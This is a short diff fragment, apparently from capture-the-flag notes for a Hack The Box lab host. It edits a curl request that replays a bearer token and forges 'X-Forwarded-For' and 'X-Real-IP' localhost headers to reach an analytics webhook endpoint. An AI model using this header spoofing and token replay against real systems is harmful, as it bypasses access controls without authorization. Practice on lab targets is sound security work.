@@ -289,10 +289,11 @@ Content-Type: application/json
 Sec-Fetch-Mode: cors
 User-Agent: node
 
-{}
-curl -i \
+curl -i -X POST \
 -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnQiOiJlc3AtYW5hbHl0aWNzIiwic2NvcGUiOiJpbnRlbC1hZ2VudCIsImlzc3VlZFRvIjoiVVNFUi1CMTI4ODgxRiIsImlhdCI6MTc3OTE5ODQ3NH0.hc57H1Rp3EsxBuhfR1N6C2SqKWKYo5_j-80-i3Vv6Qs" \
 -H "X-Forwarded-For: 127.0.0.1" \
 -H "X-Real-IP: 127.0.0.1" \
 -H "Host: espionage-intelligence.htb" \
-http://154.57.164.64:31484/esp-analytics/
+-H "Content-Type: application/json" \
+-d '{}' \
+http://154.57.164.64:31484/esp-analytics/webhook
